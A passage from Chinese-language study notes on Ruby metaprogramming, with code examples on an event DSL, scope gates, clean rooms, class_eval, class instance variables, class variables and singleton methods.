<span class="token comment"># 我们可以自由的混合事件和setup代码块，DSL还是会检测事件，在每次执行事件前都会运行所有的setup，我们希望运行后的结果为：</span>
<span class="token string-literal"><span class="token string">"Setting up sky"</span></span>
<span class="token string-literal"><span class="token string">"Setting up mountains"</span></span>

<span class="token string-literal"><span class="token string">"the sky is falling"</span></span>

<span class="token string-literal"><span class="token string">"Setting up sky"</span></span>
<span class="token string-literal"><span class="token string">"Setting up mountains"</span></span>

<span class="token string-literal"><span class="token string">"its getting closer"</span></span>

<span class="token string-literal"><span class="token string">"Setting up sky"</span></span>
<span class="token string-literal"><span class="token string">"Setting up mountains"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>setup应该给@开头的变量赋值，事件可以读取这些变量，这样后面写代码就会干净的多</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">p <span class="token string-literal"><span class="token string">"main对象的实例变量：</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token keyword">self</span><span class="token punctuation">.</span>instance_variables</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>

<span class="token variable">$LOAD_PATH</span><span class="token punctuation">.</span>unshift<span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">event</span></span><span class="token punctuation">(</span>description<span class="token punctuation">)</span>
    <span class="token comment"># 每次执行block前，先load数据获取文件，我们在其中定义一些实例变量，当加载后，该实例变量归属于main对象，这里是扁平作用域，所以可以被事件感知到</span>
    load <span class="token string-literal"><span class="token string">'setup.rb'</span></span>
    p description <span class="token keyword">if</span> <span class="token keyword">yield</span>
<span class="token keyword">end</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">setup</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">yield</span>
<span class="token keyword">end</span>

load <span class="token string-literal"><span class="token string">'events.rb'</span></span>
<span class="token comment"># 在 load 后，加载文件中</span>
p <span class="token string-literal"><span class="token string">"main对象的实例变量：</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token keyword">self</span><span class="token punctuation">.</span>instance_variables</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>专门在一个文件中定义实例数据</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">setup <span class="token keyword">do</span>
    puts <span class="token string-literal"><span class="token string">"Setting up sky"</span></span>
    <span class="token variable">@sky_height</span> <span class="token operator">=</span> <span class="token number">100</span>
<span class="token keyword">end</span>

setup <span class="token keyword">do</span>
    puts <span class="token string-literal"><span class="token string">"Setting up mountains"</span></span>
    <span class="token variable">@mountains_height</span> <span class="token operator">=</span> <span class="token number">200</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>新需求：要求按照特定的顺序执行块和事件</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token variable">$LOAD_PATH</span><span class="token punctuation">.</span>unshift<span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">setup</span></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>block<span class="token punctuation">)</span>
    <span class="token variable">@setups</span> <span class="token operator">&lt;&lt;</span> block
<span class="token keyword">end</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">event</span></span><span class="token punctuation">(</span>description<span class="token punctuation">,</span><span class="token operator">&amp;</span>block<span class="token punctuation">)</span>
    <span class="token variable">@events</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">&#123;</span><span class="token symbol">:description</span><span class="token operator">=></span>description<span class="token punctuation">,</span><span class="token symbol">:condition</span><span class="token operator">=></span>block<span class="token punctuation">&#125;</span>
<span class="token keyword">end</span>

<span class="token variable">@setups</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token variable">@events</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token comment"># 这里所有的event已经被保存，所有的setup也保存好了</span>
load <span class="token string-literal"><span class="token string">'events.rb'</span></span>

<span class="token variable">@events</span><span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>event<span class="token operator">|</span>
    <span class="token variable">@setups</span><span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>setup<span class="token operator">|</span>
        setup<span class="token punctuation">.</span>call
    <span class="token keyword">end</span>
    puts <span class="token string-literal"><span class="token string">"ALERT: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">event<span class="token punctuation">[</span><span class="token symbol">:description</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">if</span> event<span class="token punctuation">[</span><span class="token symbol">:condition</span><span class="token punctuation">]</span><span class="token punctuation">.</span>call
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="消除全局变量"><a href="#消除全局变量" class="headerlink" title="消除全局变量"></a>消除<strong>全局</strong>变量</h4><blockquote>
<p>新需求：@events 和 @setups 为顶级实例变量，但其实也是全局变量的变形，安全性有限，我们能不能消除他们，这里我们使用共享作用域</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">lambda <span class="token punctuation">&#123;</span>
    setups <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    events <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    Kernel<span class="token punctuation">.</span>send <span class="token symbol">:define_method</span><span class="token punctuation">,</span><span class="token symbol">:setup</span> <span class="token keyword">do</span> <span class="token operator">|</span><span class="token operator">&amp;</span>block<span class="token operator">|</span>
        setups <span class="token operator">&lt;&lt;</span> block
    <span class="token keyword">end</span>

    Kernel<span class="token punctuation">.</span>send <span class="token symbol">:define_method</span><span class="token punctuation">,</span><span class="token symbol">:event</span> <span class="token keyword">do</span> <span class="token operator">|</span>description<span class="token punctuation">,</span><span class="token operator">&amp;</span>block<span class="token operator">|</span>
        events <span class="token operator">&lt;&lt;</span> <span class="token punctuation">&#123;</span><span class="token symbol">:description</span><span class="token operator">=></span>description<span class="token punctuation">,</span><span class="token symbol">:condition</span><span class="token operator">=></span>block<span class="token punctuation">&#125;</span>
    <span class="token keyword">end</span>

    Kernel<span class="token punctuation">.</span>send <span class="token symbol">:define_method</span><span class="token punctuation">,</span><span class="token symbol">:each_setup</span> <span class="token keyword">do</span> <span class="token operator">|</span><span class="token operator">&amp;</span>block<span class="token operator">|</span>
        setups<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>setup<span class="token operator">|</span>
            block<span class="token punctuation">.</span>call setup
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>

    Kernel<span class="token punctuation">.</span>send <span class="token symbol">:define_method</span><span class="token punctuation">,</span><span class="token symbol">:each_event</span> <span class="token keyword">do</span> <span class="token operator">|</span><span class="token operator">&amp;</span>block<span class="token operator">|</span>
        events<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>event<span class="token operator">|</span>
            block<span class="token punctuation">.</span>call event
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">.</span>call

load <span class="token string-literal"><span class="token string">"events.rb"</span></span>

each_event <span class="token keyword">do</span> <span class="token operator">|</span>event<span class="token operator">|</span>
    each_setup <span class="token keyword">do</span> <span class="token operator">|</span>setup<span class="token operator">|</span>
        setup<span class="token punctuation">.</span>call
    <span class="token keyword">end</span>
    puts <span class="token string-literal"><span class="token string">"ALERT: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">event<span class="token punctuation">[</span><span class="token symbol">:description</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">if</span> event<span class="token punctuation">[</span><span class="token symbol">:condition</span><span class="token punctuation">]</span><span class="token punctuation">.</span>call
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    这里我们使用lambda来定义一个block，在内部定义setups 和 events，在Kernel中定义方法，这些方法能访问到block中的代码块，而其他方法则无法访问到，这样就可以保证，消除全局变量，但代码看起来更复杂了似乎</p>
<h4 id="添加一个洁净室"><a href="#添加一个洁净室" class="headerlink" title="添加一个洁净室"></a>添加一个洁净室</h4><blockquote>
<p>在目前的版本中，事件可以修改其他事件共享的顶层实例变量，我们需要在setup中定义共享变量，而不是在事件中</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">event <span class="token string-literal"><span class="token string">"define a shared variable"</span></span> <span class="token keyword">do</span>
    <span class="token variable">@x</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">end</span>

event <span class="token string-literal"><span class="token string">"define a shared variable"</span></span> <span class="token keyword">do</span>
    <span class="token variable">@x</span> <span class="token operator">=</span> <span class="token variable">@x</span> <span class="token operator">+</span> <span class="token number">1</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>改进方案，使用Object作为白板类，使用上线文探针执行block，这样每个event都是独立的，这里我们没有使用BasicObject充当白板类，因为里面缺少一些基本的方法：puts</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">each_event <span class="token keyword">do</span> <span class="token operator">|</span>event<span class="token operator">|</span>
    env <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">new</span>
    each_setup <span class="token keyword">do</span> <span class="token operator">|</span>setup<span class="token operator">|</span>
        env<span class="token punctuation">.</span>instance_eval <span class="token operator">&amp;</span>setup
    <span class="token keyword">end</span>
    puts <span class="token string-literal"><span class="token string">"ALERT: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">event<span class="token punctuation">[</span><span class="token symbol">:description</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">if</span> env<span class="token punctuation">.</span>instance_eval <span class="token operator">&amp;</span><span class="token punctuation">(</span>event<span class="token punctuation">[</span><span class="token symbol">:condition</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>作用域门 和 Ruby管理作用域的方式</li>
<li>利用扁平作用域 和共享作用域 让绑定穿越作用域</li>
<li>在对象的作用域中执行代码（通过instance_eval 或者 instance_exec） ，在洁净室中执行代码</li>
<li>在代码块和对象之间相互转化</li>
<li>在方法和对象之间相互转换</li>
<li>可调用对象（代码块，Proc，Lambda及普通方法）的区别</li>
<li>编写自己的领域专属语言</li>
</ul>
<h2 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h2><p>​    在类定义中，Java与Ruby有着极大的不同，在Java中类定义就好像你对编译器说：这是我希望对象的行为，但在对象创建前或者使用方法前，什么也不会发生。而Ruby的类定义不仅仅是规定对象的行为方式，实际上也是运行代码。</p>
<p>​    这种思想催生出两种法术：<strong>类宏</strong>可以来修改类，<strong>环绕别名</strong>可以在其他方法前后封装额外的代码，为了最大程度使用这些法术，我们将介绍<strong>单件类</strong></p>
<p>​    学习之前我们需要提醒，类不过是增强的模块，所有关于类定义的，对模块也同样适用</p>
<h3 id="深入类定义"><a href="#深入类定义" class="headerlink" title="深入类定义"></a>深入类定义</h3><blockquote>
<p>​    类中不仅能定义方法，也可以放入任何代码进行执行</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
  puts <span class="token string-literal"><span class="token string">"Hello"</span></span>  <span class="token comment"># => Hello</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>和方法和块类似，类定义也会返回最后一条语句的值</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">result <span class="token operator">=</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">self</span>
<span class="token keyword">end</span>
p result  <span class="token comment"># => MyClass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    定义类或模块儿时，类本身充当当前对象self的角色，因为类和模块儿也是对象，所以可以充当self，这里我们引入一个相关的概念：<strong>当前类</strong></p>
<h3 id="当前类"><a href="#当前类" class="headerlink" title="当前类"></a>当前类</h3><blockquote>
<p>至今为止，有几个概念混杂在一起，当前对象，当前类，当前作用域</p>
</blockquote>
<p>​    无论程序在哪个位置，都会有一个当前对象self，同样也总是有一个当前类或模块儿的存在，定义一个方法时，这个方法将成为当前类的一个实例方法。</p>
<p>​    self可以获取当前对象，但是Ruby中并没有相应的方法获取当前类的引用，我们这里有几个规则</p>
<ol>
<li>在程序的顶层，当前类为Object，这是main对象所属的类(这就是在顶层定义方法会成为Object实例方法的原因)</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 这里定义的是private实例方法，当前类为Object，所以子类也会继承到这个方法</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">say_hello</span></span>
	p <span class="token string-literal"><span class="token string">"Hello World"</span></span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">User</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hi</span></span>
		say_hello
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

obj <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token comment"># 这里是可以调用成功的</span>
obj<span class="token punctuation">.</span>hi  
say_hello
obj<span class="token punctuation">.</span>send <span class="token symbol">:say_hello</span>
<span class="token comment"># 这里无法调用</span>
obj<span class="token punctuation">.</span>say_hello  <span class="token comment"># 因为say_hello是一个私有方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>在一个方法中，当前类就是当前对象的类，比如我们在一个函数中定义另一个函数，这个内部定义的函数属于当前对象的类</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">User</span>
	<span class="token comment"># 这里一旦执行，当前类为User</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">one</span></span> 
		<span class="token comment"># 这里定义的函数生效，并属于User，</span>
		<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">two</span></span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>one
p User<span class="token punctuation">.</span>instance_methods<span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>  <span class="token comment"># => [:one, :two]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>当使用class或者module打开一个类时，这个类成为当前类</li>
</ol>
<blockquote>
<p>如果我们想将类为参数，动态的给类添加一个实例方法，我们该如何操作</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">add_method_to</span></span><span class="token punctuation">(</span>a_class<span class="token punctuation">)</span>
  <span class="token comment"># TODO : 在 a_class上定义方法 m()</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里我们引入class_eval方法</p>
<h4 id="class-eval方法"><a href="#class-eval方法" class="headerlink" title="class_eval方法"></a>class_eval方法</h4><p><strong>Module#class_eval</strong>方法会在一个已存在类的上下文中执行一个块儿。这听起来和<code>obj.instance_eval</code>很像。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">add_method_to</span></span><span class="token punctuation">(</span>a_class<span class="token punctuation">)</span>
  a_class<span class="token punctuation">.</span>class_eval <span class="token keyword">do</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">m</span></span><span class="token punctuation">;</span> <span class="token string-literal"><span class="token string">'Hello'</span></span><span class="token punctuation">;</span> <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
add_method_to <span class="token builtin">String</span>
<span class="token string-literal"><span class="token string">"abc"</span></span><span class="token punctuation">.</span>m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><p>Module#class_eval 会同时修改self和当前类，所以可以定义类的实例方法</p>
</li>
<li><p>Object#instance_eval 只修改self（这并不绝对的，我们后面会讲）</p>
</li>
</ol>
<p>​    <code>Module#class_eval</code>功能和<code>class关键字</code>类似，但更强大，因为class关键字传入 常量，而Module#class_eval，只要是代表类的变量即可使用。比我们想在运行期决定具体的类</p>
<p>​    <code>class</code>也是作用域门，会切换作用域，而<code>Module#class_eval</code>则是扁平作用域可以引入外部变量</p>
<blockquote>
<p>Module#class_eval 也有 class_exec 可以接收额外的代码块作为参数</p>
</blockquote>
<h4 id="instance-eval-和-class-eval-方法该如何选择"><a href="#instance-eval-和-class-eval-方法该如何选择" class="headerlink" title="instance_eval 和 class_eval 方法该如何选择"></a>instance_eval 和 class_eval 方法该如何选择</h4><p>​    这取决于两者的特点，instance_eval 方法打开非类的对象，而用 class_eval 方法打开类的定义，然后使用def定义方法</p>
<h3 id="类实例变量"><a href="#类实例变量" class="headerlink" title="类实例变量"></a>类实例变量</h3><blockquote>
<p>Ruby解释器假定所有的实例变量都属于当前对象self，在类定义时也是这样</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
  <span class="token variable">@my_var</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>​    这里在MyClass中定义@my_var，self为MyClass，所以@my_var归属MyClass，也就是<strong>类实例变量</strong></p>
<blockquote>
<p>这里需要声明，类实例变量 和 类实例化对象的实例变量是不同的</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token comment"># 这里当前类为MyClass，self也为MyClass，这里定义@my_var实例变量，所属MyClass</span>
	<span class="token variable">@my_var</span> <span class="token operator">=</span> <span class="token number">100</span>
	<span class="token comment"># 定义MyClass的read方法，一个指向MyClass的类方法，访问@my_var是可以的</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">read</span></span><span class="token punctuation">;</span> <span class="token variable">@my_var</span><span class="token punctuation">;</span> <span class="token keyword">end</span>
	<span class="token comment"># 定义MyClass的实例方法write，这里的@my_var 和 外面的@my_var 并不是一个变量，作用域不同</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">write</span></span><span class="token punctuation">;</span> <span class="token variable">@my_var</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token keyword">end</span>
	<span class="token comment"># 这里一样，是访问不到外部的@my_var,除非调用write方法，给类的对象创建一个@my_var</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">read</span></span><span class="token punctuation">;</span> <span class="token variable">@my_var</span><span class="token punctuation">;</span> <span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
p obj<span class="token punctuation">.</span>read  <span class="token comment"># nil</span>
obj<span class="token punctuation">.</span>write <span class="token comment"># 定义 @my_var = 2</span>
p obj<span class="token punctuation">.</span>read  <span class="token comment"># @my_var = 2</span>
p MyClass<span class="token punctuation">.</span>read <span class="token comment"># @my_var = 100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    Ruby解释器假定所有的实例变量都属于当前对象self，在类定义时也如此。</p>
<blockquote>
<p>一个类实例变量只可以被类本身所访问，而不能被类的实例或子类所访问到</p>
</blockquote>
<h4 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h4><p>​    如果想在类中定义变量，可被子类或者实例对象访问到，可以使用类变量，它更像是Java中的静态变量.</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">C</span>
	<span class="token variable">@@var</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">D</span> <span class="token operator">&lt;</span> <span class="token constant">C</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hi</span></span>
	 	<span class="token variable">@@var</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">D</span><span class="token punctuation">.</span><span class="token keyword">new</span>
p obj<span class="token punctuation">.</span>hi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>需要注意一点，盲目的使用类变量也会有问题</p>
</blockquote>
<p>​    不允许在顶级上下文中定义类变量，因为main对象所属Object类，定义类变量，则所有Object子类都会继承这个类变量，也就有修改类变量的可能，在最新的Ruby编译器中已经对这个行为禁止，并爆出错误</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token variable">@@var</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">class</span> <span class="token class-name">User</span>
	<span class="token variable">@@var</span> <span class="token operator">=</span> <span class="token number">2</span>
<span class="token keyword">end</span>
p <span class="token variable">@@var</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>这里再回顾一下Ruby中的操作符</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">p <span class="token boolean">false</span> <span class="token operator">||</span> <span class="token boolean">true</span>  <span class="token comment"># 一个为真则为真</span>
p <span class="token boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">true</span>  <span class="token comment"># 一个为假都为假</span>
p <span class="token keyword">nil</span> <span class="token operator">||</span> <span class="token string-literal"><span class="token string">"a"</span></span>     <span class="token comment"># 除了 nil 和 false，其他都为真</span>
p <span class="token string-literal"><span class="token string">"a"</span></span> <span class="token operator">||</span> <span class="token keyword">nil</span>     <span class="token comment"># || 遇到真则返回</span>
p <span class="token string-literal"><span class="token string">"a"</span></span> <span class="token operator">||</span> <span class="token string-literal"><span class="token string">'b'</span></span>

p <span class="token keyword">nil</span> <span class="token operator">&amp;&amp;</span> <span class="token string-literal"><span class="token string">"a"</span></span>     <span class="token comment"># &amp;&amp; 遇到假则返回</span>
p <span class="token string-literal"><span class="token string">"a"</span></span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">nil</span>
p <span class="token string-literal"><span class="token string">"a"</span></span> <span class="token operator">&amp;&amp;</span> <span class="token string-literal"><span class="token string">"b"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>类对象是否可以访问到类实例变量？</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token comment"># 这里@var 属于 MyClass，因为MyClass也是一个对象</span>
	<span class="token variable">@var</span> <span class="token operator">=</span> <span class="token number">1</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get</span></span>
		<span class="token comment"># 这里访问，self为MyClass.new，作用域分离</span>
		<span class="token variable">@var</span>
	<span class="token keyword">end</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">get</span></span>
		<span class="token variable">@var</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
p <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">.</span>get  <span class="token comment"># 无法访问到</span>
p MyClass<span class="token punctuation">.</span>get      <span class="token comment"># 正常输出 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>obj.instance.eval 改变obj为self，如果在Block内定义实例变量，则该实例变量属于obj</p>
<p>Class.class_eval 改变Class为self，同时改变当前类，定义实例变量属于这个类</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">get</span></span>
		<span class="token variable">@var</span> 
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get</span></span>
		<span class="token variable">@var</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

MyClass<span class="token punctuation">.</span>class_eval <span class="token keyword">do</span> 
	<span class="token variable">@var</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">end</span>

p MyClass<span class="token punctuation">.</span>get  <span class="token comment"># => 1</span>
p <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">.</span>get  <span class="token comment"># => nil</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="单件方法"><a href="#单件方法" class="headerlink" title="单件方法"></a>单件方法</h3><blockquote>
<p>我们现在想要修改一个类的实例方法有三种办法</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
<span class="token keyword">end</span>
<span class="token comment"># 1.0 猴子补丁</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">one</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># 2.0 细化</span>
<span class="token keyword">module</span> <span class="token class-name">MyClass_Plus</span>
  refine MyClass <span class="token keyword">do</span>
		<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">two</span></span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># 3.0 单件方法</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token class-name">obj</span><span class="token punctuation">.</span><span class="token function">tree</span></span>
  <span class="token comment"># 方法体</span>
<span class="token keyword">end</span>
obj<span class="token punctuation">.</span>tree<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    单件方法我们可以看到是在对象上操作， 定义的函数也只针对这个对象，其他对象并没有这个方法，所以叫做单件方法，语法：<code>def obj.method_name</code></p>
<h4 id="类方法的真相"><a href="#类方法的真相" class="headerlink" title="类方法的真相"></a>类方法的真相</h4><p>​    类方法的实质是一个类的单件方法，因为类也是一个对象，给类定义单件方法，就是类方法。</p>
